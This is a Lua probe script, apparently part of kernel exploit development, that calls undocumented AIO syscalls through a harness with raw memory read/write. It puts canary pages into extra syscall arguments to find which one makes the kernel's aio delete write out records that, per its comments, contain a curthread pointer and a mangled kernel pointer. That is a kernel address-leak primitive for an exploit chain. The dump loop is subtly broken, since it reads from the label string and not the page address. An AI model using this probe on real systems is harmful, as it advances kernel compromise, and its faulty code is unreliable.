-- CRASH_CLASS: MODERATE
-- PROBE 503a: does aio delete copy a per-id out-record into a caller address?
--
-- 13.60 delete body 0x3afd21-0x3afd6d: when [uap+0x40] != 0 and the global
-- checked by 0x8b4c78d0 is 3 or 4, the delete writes three qwords per id:
--   out[idx*0x18+0x00] = status
--   out[idx*0x18+0x08] = [[slot+0x18]]        (=[C] = curthread at create)
--   out[idx*0x18+0x10] = ([slot+0x10]>>4) ^ [slot+0x10]   (mangled D)
-- Which syscall argument lands in [uap+0x40] is unknown, so put a canary page
-- in arguments 4, 5 and 6 one at a time and see which page the kernel touches.

print("=== PROBE 503a: aio delete out-record ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local sc_c, sc_p, sc_d = make_syscall(669), make_syscall(664), make_syscall(662)
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return -1
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end
    return nil
end
local function wr(a, v)
    pcall(function() memory.write_dword(a, v) end)
end
local function wq(a, v)
    pcall(function() memory.write_qword(a, v) end)
end
local function fill(page, val, n)
    for o = 0, (n or 0x1000) - 4, 4 do wr(page + o, val) end
end
local function changed(page, val, n)
    local c, first, sample = 0, nil, {}
    for o = 0, (n or 0x1000) - 4, 4 do
        local v = rd(page + o)
        if v ~= val then
            c = c + 1
            if not first then first = o end
            if #sample < 4 then sample[#sample + 1] = string.format("%+03x:%08x", o, v) end
        end
    end
    return c, first, table.concat(sample, " ")
end

local DATA = memory.alloc(0x1000)
local OUT  = memory.alloc(0x1000)
local STATUS = memory.alloc(0x1000)
local IDS = memory.alloc(0x1000)
local P4, P5, P6 = memory.alloc(0x1000), memory.alloc(0x1000), memory.alloc(0x1000)
fill(DATA, 0)
fill(OUT, 0)

local function mk()
    wr(OUT, 0)
    local ok, r = pcall(function() return sc_c(1, DATA, 1, 1, OUT) end)
    local id = rd(OUT)
    if id == 0 then return nil, ok, r end
    wr(IDS, id)
    local ok2, r2 = pcall(function() return sc_p(IDS, 1, STATUS) end)
    return id, rd(STATUS), r2
end

local CANARY = 0xC0DEF00D
local function case(name, nargs)
    local ids = {}
    for i = 1, 2 do
        local id = mk()
        if id then ids[#ids + 1] = id end
    end
    if #ids < 2 then print(name .. ": create failed") return end
    for i = 1, #ids do wr(IDS + (i - 1) * 4, ids[i]) end
    fill(STATUS, CANARY)
    fill(P4, CANARY); fill(P5, CANARY); fill(P6, CANARY)
    local ok, ret
    if nargs == 3 then
        ok, ret = pcall(function() return sc_d(IDS, #ids, STATUS) end)
    elseif nargs == 4 then
        ok, ret = pcall(function() return sc_d(IDS, #ids, STATUS, P4) end)
    elseif nargs == 5 then
        ok, ret = pcall(function() return sc_d(IDS, #ids, STATUS, P4, P5) end)
    else
        ok, ret = pcall(function() return sc_d(IDS, #ids, STATUS, P4, P5, P6) end)
    end
    print(string.format("%s: ok=%s ret=%d ids=%d,%d", name, tostring(ok), to_num(ret), ids[1], ids[2]))
    print(string.format("  status[0]=%08x status[1]=%08x", rd(STATUS), rd(STATUS + 4)))
    local pages = { {"arg4", P4}, {"arg5", P5}, {"arg6", P6} }
    for _, p in ipairs(pages) do
        local c, first, sample = changed(p[2], CANARY)
        if c > 0 then
            print(string.format("  %s CHANGED n=%d first=%s %s", p[1], c, tostring(first), sample))
            for o = 0, 0x40, 8 do
                local q = rq(p[1] + o)
                if q then print(string.format("    %s+%02x = %s", p[2], o, tostring(q))) end
            end
        else
            print(string.format("  %s untouched", p[1]))
        end
    end
end

case("3args", 3)
case("4args", 4)
case("5args", 5)
case("6args", 6)
print("=== DONE ===")
